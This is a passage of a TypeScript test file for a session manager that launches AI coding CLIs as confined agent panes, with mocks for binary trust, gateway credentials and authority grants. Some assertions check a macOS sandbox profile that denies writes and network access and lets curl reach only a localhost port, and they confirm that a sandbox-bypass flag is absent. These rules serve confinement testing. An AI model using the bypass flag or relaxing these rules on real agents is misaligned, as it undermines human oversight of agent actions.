import { resetLicensedAccessMock } from '../__tests__/licensed-access';
beforeEach(resetLicensedAccessMock);
import { licensedAgentCount } from '../license-enforcement';
import { AcpClient } from '../acp/acp-client';
vi.mock('../license-access', async () => (await import('../__tests__/licensed-access')).licensedAccessMock);
import { requireAccess, maxAgents } from '../license-access';
import { limitsForMachine, AGENT_PANE_FOOTPRINT_MB, primeSystemMemoryCacheForTest } from '../orch/pane-admission';
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import Database from "better-sqlite3";
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { app, type WebContents } from "electron";

vi.mock("electron", async () => {
  const fs = await import("node:fs");
  const os = await import("node:os");
  const path = await import("node:path");
  const userData = fs.mkdtempSync(path.join(os.tmpdir(), "f567-pty-userdata-"));
  return { app: { getPath: () => userData, getAppPath: () => process.cwd(), isPackaged: false } };
});
import { parse } from "smol-toml";
import { heavyCommandShellEnvironment } from "../orch/native-heavy-preload";
import { cleanupHeavyZshProfile } from "../orch/native-heavy-zdotdir";
import { BUILTIN_ADAPTERS } from "../../adapters/builtin";
import { cliPtyAdapterSchema } from "../../shared/adapter-types";
import { PTY_CHANNELS } from "../../shared/channels";
import { CODEX_WORKSPACE_PERMISSION_PROFILE } from "./codex-native-authority";
import {
  PET_STUDIO_SQUAD,
  PET_STUDIO_SQUAD_ID,
} from "../../shared/pet-studio";
import { snapshotSquadAuthority } from "../orch/squad-authority-snapshot";
import { setWindowsUserEnvDepsForTests } from "./windows-user-env";
import {
  isThirdPartyClaudeFamily,
  shouldUseEphemeralHome,
} from "../orch/spawn-home-policy";
import {
  applyGatewayCredential,
  gatewayForwardsProviderCredential,
} from "./gateway-env";
import { listDurableRouteUses } from "../orch/route-provenance";

const windowsNpmShimLaunch = vi.hoisted(() => ({
  launch: null as
    | { readonly file: string; readonly argsPrefix: readonly string[] }
    | null,
}));

// F-668: atalho .cmd do npm de qualquer CLI embutida (default: nenhum).
const npmShimSpawn = vi.hoisted(() => ({
  launch: null as { file: string; argsPrefix: string[] } | null,
  calls: [] as Array<[string, string]>,
}));
vi.mock("../adapters/windows-npm-shim", () => ({
  windowsNpmShimSpawn: (adapterId: string, shimPath: string) => {
    npmShimSpawn.calls.push([adapterId, shimPath]);
    return npmShimSpawn.launch;
  },
}));

// F-992: versão já sondada por binário (o spawn só lê o cache, nunca executa).
const cliVersions = vi.hoisted(() => new Map<string, string | null>());

// Unit tests use a fake PTY host — pin absolute bin paths so spawn never
// depends on the machine PATH (same contract as production discovery).
vi.mock("../path-resolver", () => ({
  cachedCliBinaryVersion: (binPath: string) => cliVersions.get(binPath),
  resolveSpawnBinary: (command: string, preferred?: string | null) => {
    const binPath =
      preferred && preferred.startsWith("/")
        ? preferred
        : `/mock/bin/${command || "cli"}`;
    return {
      binPath,
      effectivePath: "/mock/bin",
      source: preferred ? "absolute" : "process-path",
    };
  },
  revalidateExecutable: (binPath: string) =>
    typeof binPath === "string" && binPath.startsWith("/"),
  resolveCliBinary: (command: string) => ({
    // O smoke de boot real (opt-in) precisa de um Node que exista de verdade.
    binPath: process.env.NEXUS_PROVIDER_BOOT_SMOKE === "1" && command === "node"
      ? process.execPath
      : `/mock/bin/${command}`,
    effectivePath: "/mock/bin",
    source: "process-path",
  }),
  resolveWindowsCodexNpmShimLaunch: () => windowsNpmShimLaunch.launch,
  realUserHome: () => "/mock/home",
}));

const adapterTrust = vi.hoisted(() => ({
  // Most unit fixtures use `test-cli`; mark the normal fixture ids trusted and
  // toggle Codex explicitly in the origin-forgery assertions below.
  builtinIds: new Set([
    "test-cli",
    "claude",
    "codex",
    "kimi",
    "opencode",
    "agy",
    "grok",
    "glm",
    "glm-flash",
    "longcat",
  ]),
  rejectedBinPath: null as string | null,
}));
const nativeLaunchTrust = vi.hoisted(() => ({
  currentIdentity: "vendor-native-v1",
  swapAfterQualification: false,
  qualificationCount: 0,
  revalidationCount: 0,
}));
const darwinSupervisorTrust = vi.hoisted(() => ({
  readPath: "/usr/bin/true",
  error: null as Error | null,
  resolutionCount: 0,
}));
vi.mock("../adapters/adapter-registry", async (importOriginal) => {
  const original =
    await importOriginal<typeof import("../adapters/adapter-registry")>();
  return {
    ...original,
    isBuiltinAdapter: (id: string) => adapterTrust.builtinIds.has(id),
  };
});
vi.mock("./trusted-native-cli-binary", () => ({
  supportsPinnedNativeConfinementAuthenticity: (adapterId: string) =>
    adapterId === "codex" || adapterId === "claude",
  qualifyTrustedNativeConfinementLaunch: (input: {
    adapterId: string;
    requestedBinPath: string;
  }) => {
    if (input.requestedBinPath === adapterTrust.rejectedBinPath) {
      throw new Error("executable override diverges from canonical discovery");
    }
    if (input.adapterId !== "codex" && input.adapterId !== "claude") {
      throw new Error(
        `adapter ${input.adapterId} has no pinned native confinement authenticity root`,
      );
    }
    nativeLaunchTrust.qualificationCount += 1;
    const launch = Object.freeze({
      executablePath: input.requestedBinPath,
      runtimeReadPaths: Object.freeze([]),
      providerNetworkProcessPaths: Object.freeze(
        input.adapterId === "codex" ? [process.execPath] : [],
      ),
      darwinExecutableSeal: Object.freeze({
        platform: "darwin",
        executablePath: input.requestedBinPath,
        identifier:
          input.adapterId === "claude"
            ? "com.anthropic.claude-code"
            : input.adapterId,
        teamIdentifier:
          input.adapterId === "claude" ? "Q6L2SF6YDW" : "2DC432GLL2",
        cdHash: "c9da028e2080a684d2c355e6f40ffc53c21ff7ee",
        sha256:
          "1da3f4e0e96028b8a771814293c3033dafd1971f943f6c7e79b0897fe705f590",
      }),
      testIdentity: nativeLaunchTrust.currentIdentity,
    });
    if (nativeLaunchTrust.swapAfterQualification) {
      nativeLaunchTrust.currentIdentity = "vendor-native-replaced";
      nativeLaunchTrust.swapAfterQualification = false;
    }
    return launch;
  },
  revalidateTrustedNativeConfinementLaunch: (launch: {
    testIdentity: string;
  }) => {
    nativeLaunchTrust.revalidationCount += 1;
    if (launch.testIdentity !== nativeLaunchTrust.currentIdentity) {
      throw new Error(
        "native confinement installation changed after qualification",
      );
    }
  },
}));
vi.mock("./darwin-pty-supervisor", () => ({
  currentDarwinPtySupervisorRuntime: (moduleDir: string) => ({
    platform: "darwin",
    packaged: false,
    cwd: process.cwd(),
    moduleDir,
  }),
  resolveDarwinPtySupervisor: () => {
    darwinSupervisorTrust.resolutionCount += 1;
    if (darwinSupervisorTrust.error) throw darwinSupervisorTrust.error;
    return darwinSupervisorTrust.readPath;
  },
  resolvePackagedDarwinLaunchAuthorizationReadPaths: () => [],
}));

// Keep unit fixtures on the direct PTY path; persistence has its own suite.
vi.mock("./persistent-session", () => ({
  planPersistentAgentSpawn: (input: {
    file: string;
    args: readonly string[];
  }) => ({
    mode: "direct" as const,
    file: input.file,
    args: [...input.args],
  }),
  getPersistentSessionBackend: () => ({
    killSessionSync: vi.fn(),
  }),
}));
vi.mock("../persistence/persistent-session-store", () => ({
  upsertPersistentPty: vi.fn(() => true),
  deletePersistentPty: vi.fn(),
}));
vi.mock("../feature-flags/feature-flag-registry", () => ({
  getFeatureFlagRegistry: () => ({
    isEnabled: () => false,
  }),
}));

// F-906: AGY readiness seams. Only spawns carrying NEXUS_GATE_TOKEN reach them.
const agyHeavy = vi.hoisted(() => ({
  ensure: vi.fn(async (_options: { home: string; agyBin: string; node: string; resourceDirectory: string; signal?: AbortSignal; assertCurrent?: () => void }) =>
    ({ registered: true }) as { registered: boolean; reason?: string }),
  channels: vi.fn(async (_ctx: unknown, _tmp: string, _ports: unknown, options: { transport?: string } = {}) => ({
    transport: options.transport ?? "unix",
    env: { NEXUS_HEAVY_CHANNEL_DIR: "/private/agy-channel", NEXUS_HEAVY_CHANNEL_KEY: "a".repeat(64),
      NEXUS_HEAVY_CHANNEL_EPOCH: "agy-epoch", NEXUS_HEAVY_CHANNEL_PUBLIC_KEY: "agy-public" },
    dispose: async () => {},
  })),
}));
vi.mock("../orch/native-heavy-agy-plugin", () => ({ ensureAgyNativeHeavyPlugin: agyHeavy.ensure }));
vi.mock("../orch/native-heavy-local-channel", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../orch/native-heavy-local-channel")>()),
  createNativeHeavyLocalChannel: agyHeavy.channels,
}));

// F-212: captura dos eventos de ciclo de vida PTY. A escrita NDJSON em disco é
// responsabilidade de main-trace (testada lá); aqui só interessa o payload.
const lifecycleTrace = vi.hoisted(() => ({
  events: [] as Array<Record<string, unknown>>,
}));
vi.mock("../observability/main-trace", () => ({
  trace: (event: Record<string, unknown>) => {
    lifecycleTrace.events.push(event);
  },
}));

import {
  __resetPtyShutdownLifecycleForTests,
  agentEnv,
  acknowledgeSessionOutput,
  bindOwnedAgentSessionMission,
  configureAgentHookEndpointPath,
  consumeMissionOrchestratorGrant,
  getAgentSessionInfo,
  recordAuthenticatedNativeArgvSubmission,
  hasAcceptedNativeArgvPrompt,
  getLastSessionInputOrigin,
  getOwnedAgentSessionInfo,
  getSessionState,
  getSessionProviderConversation,
  isSessionDetached,
  adoptMainOwnedAgentSession,
  adoptUserAgentSessionAsMissionOrchestrator,
  releaseOperatorOpenedAgentSession,
  returnAdoptedAgentSessionToUser,
  killSession,
  killSessionsFor,
  listAgentSessions,
  liveSessionSummary,
  probePaneFootprints,
  recoverSessionOutput,
  setPtyHost,
  setAgentSpawnHook,
  setDeferredInitialPromptHook,
  setResumeSessionLookup,
  setResumeSessionForget,
  setSessionDictationHook,
  setSquadCliPolicyLookupForTests,
  spawnAgentSession,
  spawnMainOwnedAgentSession,
  spawnSession,
  publishSessionActivityState,
  tapSessionTermination,
  terminateAllSessions,
  orchKillSession,
  orchTerminateSession,
  registeredOrchestratorSessionsForMission,
  orchWriteSession,
  resizeSession,
  operatorShellLoginArgs,
  writeSession,
  tapSessionInput,
  inspectSessionLease,
  warmPool,
  tryAdoptWarmSession,
} from "./pty-manager";
import type {
  PtyHost,
  PtyProcHandle,
  PtySessionHandlers,
  PtySpawnReadiness,
  PtySpawnSpec,
} from "./pty-host-core";
import type { CliPtyAdapter } from "../../shared/adapter-types";
import type { BoundSpawnAuthority } from "../orch/spawn-authority";
import {
  bindTokenToSession,
  getContext,
  mintToken,
  resetGateForTests,
  releaseSession,
  returnOperatorOpenedSessionToUser,
  adoptUserContextAsMissionOrchestrator,
} from "../orch/gate";
import { installMcpSessionTerminationRevocation } from "../orch/mcp-session-revocation";
import { cleanupCliMcpSession } from "../orch/cli-mcp-session-config";
import { buildControlArgs } from "../adapters/control-args";
import { prepareCheckoutProviderHome } from "../adapters/managed-credentials";
import type { CodexStartupPolicy } from "../orch/cli-mcp-session-types";
import { getProviderPaneSession, saveProviderPaneSession } from "../persistence/provider-session-store";
import { __resetHookEditProvenanceForTests, recordHookEditProvenance } from "../orch/hook-edit-provenance";
import { __resetHookRegressionForTests, handleHookRegressionRequest } from "../orch/hook-regression-endpoint";
import {
  __resetRegressionGateForTests,
  runRegressionGate,
  type RegressionExec,
  type RegressionGateResult,
} from "../regression-gate/regression-gate";
import { computeBlastRadius } from "../context/orientation/orientation-blast-radius";
import type { ProjectOrientationMap } from "../context/orientation/orientation-types";
import { ProcessGitRunner } from "../runtime/git-command";
import { mimoSessionOwnerKey } from "../adapters/mimo-session-owner";
import { qwenNeedsLogicalCwd } from "./qwen-long-cwd";

afterAll(() => fs.rmSync(app.getPath("userData"), { recursive: true, force: true }));

const inheritedPaneGuard = process.env.NEXUS_PANE_GUARD;
beforeEach(() => {
  // Ownership fixtures retain fake children across cases. Resource admission
  // has its own block below, which explicitly enables the real gate.
  process.env.NEXUS_PANE_GUARD = 'off';
  windowsNpmShimLaunch.launch = null;
  // Most legacy hardening cases exercise the explicit hardened mode. Tests for
  // the default autopilot opt into operator-choice locally.
  setSquadCliPolicyLookupForTests(() => "governed");
});

afterEach(() => {
  if (inheritedPaneGuard === undefined) delete process.env.NEXUS_PANE_GUARD;
  else process.env.NEXUS_PANE_GUARD = inheritedPaneGuard;
  setSquadCliPolicyLookupForTests(null);
});

function trustedSpawn(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  return {
    source: "direct-user",
    context: null,
    cwd,
    scope: {
      version: 1,
      installationId: "installation-test",
      projectId: "project-test",
      checkoutId: "checkout-test",
      rootRealPath: cwd,
      identitySource: "provisional",
    },
  };
}

function missionGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  return {
    ...base,
    source: "legacy-squad",
    context: {
      squadId: "review-squad",
      agentName: "Maestro",
      role: "orchestrator",
      allowedTools: ["nexus_pane_spawn"],
      allowedSkills: ["review"],
    },
  };
}

function missionGrantFor(missionId: string): BoundSpawnAuthority {
  const grant = missionGrant();
  return {
    ...grant,
    context: {
      ...grant.context!,
      missionId,
    },
  };
}

function petStudioGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  const maker = PET_STUDIO_SQUAD.agents[0]!;
  return {
    ...base,
    source: "legacy-squad",
    coordinationScope: base.scope,
    context: {
      squadId: PET_STUDIO_SQUAD_ID,
      agentName: maker.agentName,
      role: "orchestrator",
      allowedTools: maker.allowedTools ?? null,
      allowedSkills: maker.allowedSkills ?? null,
      scope: base.scope,
    },
  };
}

function persistedPetStudioGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  const maker = PET_STUDIO_SQUAD.agents[0]!;
  const contextRevision = "pet-context-revision";
  return {
    ...base,
    source: "persisted-pane",
    coordinationScope: base.scope,
    context: {
      missionId: "mission-pet",
      squadId: PET_STUDIO_SQUAD_ID,
      agentName: maker.agentName,
      role: "orchestrator",
      allowedTools: maker.allowedTools ?? null,
      allowedSkills: maker.allowedSkills ?? null,
      contextRevision,
      authoritySeal: {
        intentVersion: 1,
        intentContractHash: "a".repeat(64),
        contextRevision,
        contractHash: "b".repeat(64),
        squadRevisionHash: snapshotSquadAuthority(PET_STUDIO_SQUAD).hash,
      },
      scope: base.scope,
      executionScope: base.scope,
    },
  };
}

function revisionBoundWorker(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  const coordinationScope = {
    ...base.scope,
    rootRealPath: path.dirname(cwd),
  };
  return {
    ...base,
    source: "pending",
    coordinationScope,
    context: {
      missionId: "mission-worker",
      contextRevision: "context-revision-worker",
      role: "worker",
      workerIncarnationId: "worker-incarnation-main-owned",
      allowedTools: [],
      allowedSkills: null,
      scope: coordinationScope,
      executionScope: base.scope,
    },
  };
}

function preRevisionMissionWorker(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  const coordinationScope = {
    ...base.scope,
    rootRealPath: path.dirname(cwd),
  };
  return {
    ...base,
    source: "pending",
    coordinationScope,
    context: {
      missionId: "mission-worker-before-prevc",
      role: "worker",
      workerIncarnationId: "worker-before-prevc",
      allowedTools: null,
      allowedSkills: null,
      scope: coordinationScope,
      executionScope: base.scope,
    },
  };
}

// Ownership tests exercise the renderer capability boundary, not autonomous
// task execution. Keep them on the explicit legacy/manual path so a generic
// fixture does not accidentally claim the Codex-only worker sandbox.
function legacyManualWorker(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const authority = revisionBoundWorker(cwd);
  return {
    ...authority,
    context: {
      ...authority.context!,
      contextRevision: undefined,
    },
  };
}

function persistedMissionGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  return {
    ...base,
    source: "persisted-pane",
    coordinationScope: base.scope,
    context: {
      missionId: "mission-persisted",
      agentName: "Persisted orchestrator",
      role: "orchestrator",
      allowedTools: null,
      allowedSkills: null,
      scope: base.scope,
      executionScope: base.scope,
    },
  };
}

function persistedWorkerGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  const coordinationScope = {
    ...base.scope,
    rootRealPath: path.dirname(cwd),
  };
  return {
    ...base,
    source: "persisted-pane",
    coordinationScope,
    context: {
      missionId: "mission-persisted-worker",
      agentName: "Persisted worker",
      role: "worker",
      workerIncarnationId: "worker-incarnation-persisted",
      allowedTools: [],
      allowedSkills: null,
      scope: coordinationScope,
      executionScope: base.scope,
    },
  };
}

// A minimal, valid cli-pty adapter shaped just enough for agentEnv(). Only the
// `env` block matters here; the rest satisfies the type.
function makeAdapter(
  env: CliPtyAdapter["env"],
  spawnPatch: Partial<CliPtyAdapter["spawn"]> = {},
): CliPtyAdapter {
  return {
    kind: "cli-pty",
    id: "test-cli",
    label: "Test CLI",
    version: "1.0.0",
    icon: "🤖",
    bin: "test-cli",
    detect: "test-cli --version",
    install: { method: "npm", command: "npm install -g test-cli" },
    auth: { method: "none" },
    spawn: {
      interactive: ["test-cli"],
      headless: ["test-cli", "--prompt", "{{PROMPT}}"],
      ptyRequired: true,
      resumeArgs: [],
      extraArgs: [],
      ...spawnPatch,
    },
    env,
    models: { flag: "--model", list: ["default"], default: "default" },
    promptInjection: {
      method: "arg",
      trailingNewline: true,
      bracketedPaste: false,
    },
    stateParsing: {
      idle: { type: "timeout", ms: 500 },
      shellIntegration: false,
      exitCodes: {},
    },
    quirks: {
      altScreen: false,
      requiresNoAutoUpdate: false,
      mcpAutoload: false,
      nexusMcp: "none",
    },
    control: {
      permission: {
        safe: ["--sandbox", "read-only"],
        yolo: [],
        modes: {},
        default: "",
      },
    },
  } as CliPtyAdapter;
}

function builtinCliPtyAdapter(id: string): CliPtyAdapter {
  const raw = BUILTIN_ADAPTERS.find(
    (adapter) => (adapter as { id?: string }).id === id,
  );
  return cliPtyAdapterSchema.parse(raw);
}

function makeCodexAdapter(
  env: CliPtyAdapter["env"] = {
    static: {},
    passthrough: [],
    ephemeralHome: false,
  },
): CliPtyAdapter {
  const builtin = builtinCliPtyAdapter("codex");
  return {
    ...builtin,
    env,
  };
}

function installGovernedCodexTestHook(
  root: string,
  attachmentReadPath?: string,
  startupPolicy?: CodexStartupPolicy,
): () => void {
  const home = path.join(root, "home");
  fs.mkdirSync(home, { recursive: true });
  vi.stubEnv("HOME", home);
  // Node's os.homedir() reads USERPROFILE on Windows rather than HOME.
  // Keep the fixture's provider home identical across all supported hosts.
  vi.stubEnv("USERPROFILE", home);
  const tokens: string[] = [];
  setAgentSpawnHook((_adapter, _request, authority) => {
    const meta = authority.context;
    const ctx = mintToken({
      label: "governed-codex-test",
      role: meta?.role ?? "user",
      missionId: meta?.missionId,
      contextRevision: meta?.contextRevision,
      workerIncarnationId: meta?.workerIncarnationId,
      scope: authority.coordinationScope ?? authority.scope,
      executionScope: authority.scope,
      allowedTools: meta?.allowedTools ?? null,
      allowedSkills: meta?.allowedSkills ?? null,
    });
    tokens.push(ctx.token);
    return {
      authorityToken: ctx.token,
      env: { NEXUS_MCP_TOKEN: ctx.token },
      extraArgs: [],
      ...(startupPolicy ? { codexStartupPolicy: startupPolicy } : {}),
      ...(attachmentReadPath
        ? { attachmentReadPaths: [attachmentReadPath] }
        : {}),
    };
  });
  return () => {
    for (const token of tokens) cleanupCliMcpSession(token);
    setAgentSpawnHook(null);
    resetGateForTests();
    vi.unstubAllEnvs();
  };
}

function seedCodexResumeState(root: string, sessionId: string): void {
  const nativeHome = path.join(root, "home", ".codex");
  fs.mkdirSync(nativeHome, { recursive: true });
  fs.writeFileSync(path.join(nativeHome, "auth.json"), "{}");
  const codexHome = path.join(app.getPath("userData"), "provider-state", "codex", "checkout-test");
  fs.rmSync(codexHome, { recursive: true, force: true });
  const rollout = path.join(
    codexHome,
    "sessions",
    "2026",
    "07",
    "26",
    `rollout-${sessionId}.jsonl`,
  );
  fs.mkdirSync(path.dirname(rollout), { recursive: true });
  fs.writeFileSync(path.join(codexHome, "auth.json"), "{}");
  fs.writeFileSync(rollout, '{"type":"session_meta"}\n');
  const db = new Database(path.join(codexHome, "state_5.sqlite"));
  try {
    db.exec(`
      CREATE TABLE backfill_state (
        id INTEGER PRIMARY KEY,
        status TEXT NOT NULL
      );
      CREATE TABLE threads (
        id TEXT PRIMARY KEY,
        rollout_path TEXT NOT NULL
      );
      INSERT INTO backfill_state (id, status) VALUES (1, 'complete');
    `);
    db.prepare(
      "INSERT INTO threads (id, rollout_path) VALUES (?, ?)",
    ).run(sessionId, rollout);
  } finally {
    db.close();
  }
}

function governedCodexPermissionProfile(spec: PtySpawnSpec): string | undefined {
  const codexHome = spec.env.CODEX_HOME;
  if (!codexHome) return undefined;
  const config = parse(
    fs.readFileSync(path.join(codexHome, "config.toml"), "utf8"),
  ) as { default_permissions?: string };
  return config.default_permissions;
}

function governedCodexArgv(spec: PtySpawnSpec): string[] {
  const executableIndex = spec.args.indexOf("/mock/bin/codex");
  return executableIndex >= 0
    ? spec.args.slice(executableIndex + 1)
    : spec.args;
}

function expectDarwinCodexOuterSandbox(spec: PtySpawnSpec): void {
  expect(spec.file).toBe("/usr/bin/sandbox-exec");
  expect(spec.args[0]).toBe("-p");
  expect(spec.args[1]).toContain("(deny file-write*)");
  expect(spec.args[1]).toContain("(deny network*)");
  expect(spec.args[1]).toContain("(with-filter (process-path ");
  expect(spec.args[1]).toContain('(literal "/usr/bin/true")');
  expect(
    spec.args[1].match(/\(with-filter \(process-path /gu),
  ).toHaveLength(1);
  expect(spec.args).toContain("/mock/bin/codex");
  expect(spec.darwinExecutableSeal).toMatchObject({
    platform: "darwin",
    executablePath: "/mock/bin/codex",
    identifier: "codex",
    teamIdentifier: "2DC432GLL2",
  });
  expect(governedCodexArgv(spec)).toEqual(
    expect.arrayContaining([
      "--sandbox",
      "danger-full-access",
      "--ask-for-approval",
      "on-request",
    ]),
  );
  expect(governedCodexArgv(spec)).not.toContain(
    "--dangerously-bypass-approvals-and-sandbox",
  );
}

function expectHookLoopbackGrant(
  spec: PtySpawnSpec,
  port: number,
): void {
  expect(spec.args[1]).toContain(
    `(with-filter (process-path "/usr/bin/curl") ` +
      `(allow network-outbound (remote tcp "localhost:${port}")))`,
  );
}

describe("gateway de IA local (OmniRoute-like)", () => {
  const GATEWAY = "http://127.0.0.1:20128/v1";

  // A máquina do desenvolvedor (ou o wrapper da CLI) pode exportar
  // ANTHROPIC_BASE_URL; o passthrough a copiaria e o teste deixaria de medir o
  // gateway. Ambiente controlado por bloco.
  const inheritedBaseUrl = process.env.ANTHROPIC_BASE_URL;
  beforeEach(() => {
    delete process.env.ANTHROPIC_BASE_URL;
  });
  afterEach(() => {
    if (inheritedBaseUrl === undefined) delete process.env.ANTHROPIC_BASE_URL;
    else process.env.ANTHROPIC_BASE_URL = inheritedBaseUrl;
  });

  // Claude nativo: declara a base URL no passthrough, NÃO pina endpoint em
  // static, e é Claude-family (mcpAutoload) — o caso que o gateway quebrava.
  function claudeLike(): CliPtyAdapter {
    const adapter = makeAdapter({
      static: { MCP_TIMEOUT: "15000" },
      passthrough: ["ANTHROPIC_API_KEY", "ANTHROPIC_BASE_URL"],
      ephemeralHome: false,
    });
    return {
      ...adapter,
      id: "claude",
      quirks: { ...adapter.quirks, mcpAutoload: true },
    };
  }

  it("F-1594: todo pane leva a política do HyperFrames, sem DO_NOT_TRACK global", () => {
    const env = agentEnv(claudeLike(), null);
    expect(env).toMatchObject({
      HYPERFRAMES_NO_TELEMETRY: "1",
      HYPERFRAMES_SKIP_SKILLS: "1",
      HYPERFRAMES_NO_UPDATE_CHECK: "1",
    });
    expect(env.DO_NOT_TRACK).toBeUndefined();
  });

  it("aponta para o gateway a base URL que o adapter declarou", () => {
    const env = agentEnv(claudeLike(), GATEWAY);
    expect(env.ANTHROPIC_BASE_URL).toBe(GATEWAY);
    expect(env.OPENAI_BASE_URL).toBeUndefined();
  });

  it("mantém o endpoint do plano quando o adapter o pina em static", () => {
    const glmLike = makeAdapter({
      static: { ANTHROPIC_BASE_URL: "https://api.z.ai/api/anthropic" },
      passthrough: ["ANTHROPIC_BASE_URL"],
      ephemeralHome: false,
    });
    const env = agentEnv(glmLike, GATEWAY);
    expect(env.ANTHROPIC_BASE_URL).toBe("https://api.z.ai/api/anthropic");
  });

  // O Qwen Code piscava/redesenhava no ConPTY do Windows. Só o pane qwen recebe
  // a variável (env.static do manifesto, mesclada aqui); nada toca o
  // ~/.qwen/settings.json do operador.
  it("o pane Qwen força saída sincronizada no Windows", async () => {
    const { BUILTIN_ADAPTERS } = await import("../../adapters/builtin");
    const manifests = BUILTIN_ADAPTERS as ReadonlyArray<{
      id: string;
      env?: { static?: Record<string, string> };
    }>;
    const manifest = manifests.find((entry) => entry.id === "qwen");
    if (!manifest) throw new Error("manifesto do qwen ausente");
    const { adapterSchema } = await import("../../shared/adapter-types");
    const adapter = adapterSchema.parse(manifest);
    if (adapter.kind !== "cli-pty") throw new Error("qwen não é cli-pty");
    expect(agentEnv(adapter, null).QWEN_CODE_FORCE_SYNCHRONIZED_OUTPUT).toBe("1");
    // Só o qwen: nenhum outro adapter embutido herda a variável.
    expect(
      manifests
        .filter((entry) => entry.id !== "qwen")
        .some((entry) =>
          Object.keys(entry.env?.static ?? {}).includes(
            "QWEN_CODE_FORCE_SYNCHRONIZED_OUTPUT",
          ),
        ),
    ).toBe(false);
  });

  it("constrói um env de identidade sem o gateway", () => {
    const adapter = claudeLike();
    expect(agentEnv(adapter, GATEWAY).ANTHROPIC_BASE_URL).toBe(GATEWAY);
    expect(agentEnv(adapter, null).ANTHROPIC_BASE_URL).toBeUndefined();
  });

  // REGRESSÃO: o gateway chegava ao snapshot que o spawn hook usa para decidir
  // HOME/credencial. O Claude de assinatura virava "provider de terceiro",
  // ganhava HOME efêmero SEM carregar a credencial nativa e pedia /login no
  // meio da missão. As três chamadas de shouldUseEphemeralHome (pty-ipc,
  // main-owned-pane-runtime e mcp-server) têm de concordar — só a última
  // recebe effectiveEnv, então o env de identidade não pode conter o gateway.
  it("não classifica o Claude nativo como provider de terceiro com o gateway ligado", () => {
    const adapter = claudeLike();
    // Exatamente o que pty-manager passa ao spawn hook: agentEnv(adapter, null).
    const identityEnv = agentEnv(adapter, null) as Record<string, string>;

    expect(isThirdPartyClaudeFamily(adapter, identityEnv)).toBe(false);

    // pty-ipc / main-owned-pane-runtime (sem effectiveEnv) vs mcp-server (com).
    const semEffectiveEnv = shouldUseEphemeralHome(adapter, true, {
      mode: "operator-choice",
    });
    const comEffectiveEnv = shouldUseEphemeralHome(adapter, true, {
      mode: "operator-choice",
      effectiveEnv: identityEnv,
    });
    expect(comEffectiveEnv).toBe(semEffectiveEnv);
    expect(comEffectiveEnv).toBe(false);
  });

  it("ainda reconhece provider de terceiro de verdade (endpoint do plano)", () => {
    const glmLike = makeAdapter({
      static: { ANTHROPIC_BASE_URL: "https://api.z.ai/api/anthropic" },
      passthrough: ["ANTHROPIC_BASE_URL"],
      ephemeralHome: false,
    });
    const thirdParty: CliPtyAdapter = {
      ...glmLike,
      bin: 'claude',
      quirks: { ...glmLike.quirks, mcpAutoload: true },
    };
    expect(
      isThirdPartyClaudeFamily(
        thirdParty,
        agentEnv(thirdParty, GATEWAY) as Record<string, string>,
      ),
    ).toBe(true);
  });

  it("injeta a credencial do gateway só nas vars que a CLI declarou", () => {
    const env: NodeJS.ProcessEnv = {};
    applyGatewayCredential(env, claudeLike(), GATEWAY, "gw-key");
    expect(env.ANTHROPIC_API_KEY).toBe("gw-key");
    expect(env.OPENAI_API_KEY).toBeUndefined();
  });

  it.each(['owned', 'foreign-key', 'foreign-route'] as const)('F-1104: passes the actual %s gateway transport separately from provider identity', async changed => {
    const synthetic = 'rt-11111111-1111-4111-8111-111111111111', ownBase = 'http://127.0.0.1:45678';
    const actualKey = changed === 'foreign-key' ? 'foreign-11111111-1111-4111-8111-111111111111' : synthetic;
    const actualBase = changed === 'foreign-route' ? 'http://127.0.0.1:45679' : ownBase;
    vi.stubEnv('ANTHROPIC_API_KEY', synthetic); vi.stubEnv('ANTHROPIC_BASE_URL', ownBase);
    vi.stubEnv('NEXUS_AI_GATEWAY_BASE_URL', actualBase); vi.stubEnv('NEXUS_AI_GATEWAY_API_KEY', actualKey);
    const host = fakeHost(); setPtyHost(host.host);
    let identity: Readonly<Record<string, string>> | undefined, transport: Readonly<Record<string, string>> | undefined;
    setAgentSpawnHook((_adapter, _req, _authority, prepared, actual) => { identity = prepared; transport = actual; return null; });
    let sessionId: string | undefined;
    try {
      sessionId = spawnAgentSession(fakeWc(), { kind: 'cli-agent', cols: 80, rows: 24 }, claudeLike(), {}, trustedSpawn()).sessionId;
      const child = host.specFor(sessionId).env;
      expect(identity?.ANTHROPIC_API_KEY).toBe(synthetic); expect(identity?.ANTHROPIC_BASE_URL).toBe(ownBase);
      expect(transport?.ANTHROPIC_API_KEY).toBe(actualKey); expect(transport?.ANTHROPIC_BASE_URL).toBe(actualBase);
      expect(transport?.ANTHROPIC_API_KEY).toBe(child.ANTHROPIC_API_KEY); expect(transport?.ANTHROPIC_BASE_URL).toBe(child.ANTHROPIC_BASE_URL);
      expect(Object.isFrozen(transport)).toBe(true);
    } finally { if (sessionId) await orchTerminateSession(sessionId); setAgentSpawnHook(null); vi.unstubAllEnvs(); }
  });

  it("sem chave de gateway, avisa que a credencial do provider vai junto", () => {
    expect(
      gatewayForwardsProviderCredential(claudeLike(), GATEWAY, null),
    ).toBe(true);
    expect(
      gatewayForwardsProviderCredential(claudeLike(), GATEWAY, "gw-key"),
    ).toBe(false);
  });

  it("F-1567: repassa o descritor de injeção do Qwen ao hook de spawn (6º arg)", async () => {
    const host = fakeHost();
    setPtyHost(host.host);
    let hints: unknown;
    setAgentSpawnHook((_a, _r, _auth, _prepared, _transport, providerSpawnHints) => {
      hints = providerSpawnHints;
      return null;
    });
    const injection = {
